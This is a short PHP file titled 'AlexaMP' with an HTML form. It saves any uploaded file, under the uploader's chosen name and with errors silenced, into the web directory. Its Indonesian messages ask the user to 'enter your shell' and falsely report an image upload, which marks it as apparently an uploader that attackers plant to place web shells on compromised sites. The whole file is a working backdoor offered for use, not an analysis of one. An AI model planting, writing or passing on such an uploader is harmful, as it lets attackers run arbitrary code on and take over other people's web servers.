<title>AlexaMP</title><form action="" method="post" enctype="multipart/form-data">
	<input type="file" name="m_upload"><input type="submit" name="upload" value="-=(x)=-">
	</form>
	
	
	<?php error_reporting(0);?>
	<?php
	$post=$_POST["upload"];
	if(isset($_POST["upload"]))
	$target_file = basename($_FILES["m_upload"]["name"]);
	{
		if(move_uploaded_file($_FILES["m_upload"]["tmp_name"], $target_file)){
			echo "<script>swal('Berhasil!', 'Gambar Berhasil di Upload', 'success');</script>";
		}else{
			echo "Masukkan Shell Kamu Bos!!";
		}
	}
	?>
